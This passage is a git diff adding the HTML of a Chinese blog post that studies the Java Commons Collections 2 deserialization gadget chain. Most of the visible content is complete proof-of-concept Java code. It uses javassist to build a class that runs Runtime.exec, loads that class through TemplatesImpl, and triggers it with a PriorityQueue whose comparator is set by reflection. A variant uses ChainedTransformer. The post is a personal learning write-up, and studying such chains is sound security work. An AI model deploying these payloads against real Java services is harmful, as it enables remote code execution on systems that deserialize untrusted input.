+        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><img src="https://kingofkb.github.io/medias/image/20220829/calc1.png"></p>
+<h4 id="templatesImpl"><a href="#templatesImpl" class="headerlink" title="templatesImpl"></a>templatesImpl</h4><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()会实例化一个自定义的类。其中，这一个类是TemplatesImpl的一个属性（字节码形式）<br>我们不是可以执行任意方法了吗，构造一个恶意类的字节码让他实例化就行了。<br>SE写的博客中就是这种方法。</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>ClassPool<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javassist<span class="token punctuation">.</span>CtClass<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span>TransformingComparator<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PriorityQueue<span class="token punctuation">;</span>
+
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">exp</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        String AbstractTranslet<span class="token operator">=</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">;</span>
+        String TemplatesImpl<span class="token operator">=</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">;</span>
+
+        ClassPool classPool<span class="token operator">=</span>ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        classPool<span class="token punctuation">.</span><span class="token function">appendClassPath</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        CtClass payload<span class="token operator">=</span>classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"CC2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        payload<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        payload<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token operator">=</span>payload<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//转换为byte数组</span>
+
+        Object templatesImpl<span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>TemplatesImpl<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field field<span class="token operator">=</span>templatesImpl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//暴力反射</span>
+        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        Field field1<span class="token operator">=</span>templatesImpl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field1<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//暴力反射</span>
+        field1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        InvokerTransformer transformer<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        TransformingComparator comparator <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        PriorityQueue queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        Field field2<span class="token operator">=</span>queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field2<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field2<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span>comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        Field field3<span class="token operator">=</span>queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"queue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field3<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field3<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templatesImpl<span class="token punctuation">,</span>templatesImpl<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        ObjectOutputStream outputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"test.out"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        outputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        ObjectInputStream inputStream<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"test.out"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        inputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><img src="https://kingofkb.github.io/medias/image/20220829/calc2.png"></p>
+<h4 id="完整poc分析"><a href="#完整poc分析" class="headerlink" title="完整poc分析"></a>完整poc分析</h4><p>直接贴了桥的，桥将两种方法的调用都写了，并且将具体分析写入了注释当中，可以跟着学习一下。</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> learn<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javassist<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span>TransformingComparator<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PriorityQueue<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsCollections2</span> <span class="token keyword">extends</span> <span class="token class-name">tools<span class="token punctuation">.</span>SerAndDe</span><span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">/*
+    Gadget chain:
+        ObjectInputStream.readObject()
+            PriorityQueue.readObject()
+                ...
+                    TransformingComparator.compare()
+                        InvokerTransformer.transform()
+                            Method.invoke()
+                                Runtime.exec()
+ */</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
+<span class="token comment" spellcheck="true">//        poc1();</span>
+        <span class="token function">poc2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">poc1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
+        ChainedTransformer chain<span class="token operator">=</span><span class="token function">getChainedTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        TransformingComparator comparator<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>chain<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        PriorityQueue queue<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//debug发现size>=2才行</span>
+        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//comparator直接构造器设置的话，add的时候会类型错误。所以反射设置</span>
+        Class <span class="token class-name">clazz</span><span class="token operator">=</span>queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field comparatorField<span class="token operator">=</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        comparatorField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        comparatorField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">poc2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">//制作父类为AbstractTranslet的RCE类的字节码bytes</span>
+        ClassPool classPool<span class="token operator">=</span>ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回默认的类池</span>
+        classPool<span class="token punctuation">.</span><span class="token function">appendClassPath</span><span class="token punctuation">(</span><span class="token string">"AbstractTranslet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//添加AbstractTranslet的搜索路径</span>
+        CtClass payload<span class="token operator">=</span>classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"CommonsCollections22222222222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建一个新的public类</span>
+        payload<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet</span>
+        payload<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token operator">=</span>payload<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//转换为byte数组</span>
+        <span class="token comment" spellcheck="true">//制作templatesImpl</span>
+        Object templatesImpl<span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//反射创建TemplatesImpl</span>
+        Field field<span class="token operator">=</span>templatesImpl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//反射获取templatesImpl的_bytecodes字段</span>
+        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//暴力反射</span>
+        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将templatesImpl上的_bytecodes字段设置为runtime的byte数组</span>
+        Field field1<span class="token operator">=</span>templatesImpl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//反射获取templatesImpl的_name字段</span>
+        field1<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//暴力反射</span>
+        field1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将templatesImpl上的_name字段设置为test</span>
+        <span class="token comment" spellcheck="true">//制作transformer</span>
+        InvokerTransformer transformer<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//接下来只需调用transformer.transform(templatesImpl)</span>
+<span class="token comment" spellcheck="true">//        transformer.transform()</span>
+        TransformingComparator comparator<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        PriorityQueue queue<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//让size=2</span>
+        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//        反射，强行往queue塞templatesImpl</span>
+        Class <span class="token class-name">queueClass</span><span class="token operator">=</span>queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field queueField<span class="token operator">=</span>queueClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"queue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queueField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queueField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templatesImpl<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">//反射强写comparator</span>
+        Class <span class="token class-name">clazz</span><span class="token operator">=</span>queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field comparatorField<span class="token operator">=</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        comparatorField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        comparatorField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">deserialize</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">static</span> ChainedTransformer <span class="token function">getChainedTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        ConstantTransformer ct<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        InvokerTransformer it1<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>
+                <span class="token string">"getMethod"</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
+        <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        InvokerTransformer it2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>
+                <span class="token string">"invoke"</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
+        <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        InvokerTransformer it_exec<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>
+                <span class="token string">"exec"</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span>
+        <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>ct<span class="token punctuation">,</span>it1<span class="token punctuation">,</span>it2<span class="token punctuation">,</span>it_exec<span class="token punctuation">}</span><span class="token punctuation">;</span>
+        ChainedTransformer chain<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> chain<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>java cc2链学习的博客拖了挺久的，七月多就开始写了，一直写到9月2日，中间学车加上出去旅游浪费了一段时间，后面会加快进度，尽快先将cc链部分赶紧看完，先熟悉一遍，然后在此基础上复现一些java类型题目，反过头再把cc链详细学习，cc链学习着实让人头大。</p>
+<p>参考链接：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kingbridge/articles/16141397.html">https://www.cnblogs.com/kingbridge/articles/16141397.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0x7e/p/14400933.html">https://www.cnblogs.com/0x7e/p/14400933.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43818995/article/details/122184245">https://blog.csdn.net/weixin_43818995/article/details/122184245</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44769520/article/details/124849524">https://blog.csdn.net/qq_44769520/article/details/124849524</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
